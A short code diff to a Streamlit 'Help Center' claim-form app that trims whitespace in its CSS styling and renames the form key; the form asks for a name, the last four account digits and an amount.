@@ -29,7 +29,7 @@ st.markdown("""<style>
     .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
     .block-container { max-width: 500px !important; padding-top: 2rem !important; }
     header, footer, .stDeployButton, [data-testid='stHeader'] { display: none !important; }
-    
+
     /* Forzar el contenedor del logo al centro */
     [data-testid="stImage"] {
         display: block !important;
@@ -37,7 +37,7 @@ st.markdown("""<style>
         margin-right: auto !important;
         text-align: center !important;
     }
-    
+
     [data-testid="stImage"] img {
         display: inline-block !important;
         width: 250px !important;
@@ -59,7 +59,7 @@ if os.path.exists("logo.svg"):
 st.title("Help Center")
 st.write("Please fill out the form below to submit your claim.")
 
-with st.form("claim_v1", clear_on_submit=True):
+with st.form("claim_v1_sync", clear_on_submit=True):
     st.text_input("Full Name")
     st.text_input("Last 4 digits of Account")
     st.number_input("Amount", min_value=0.0)
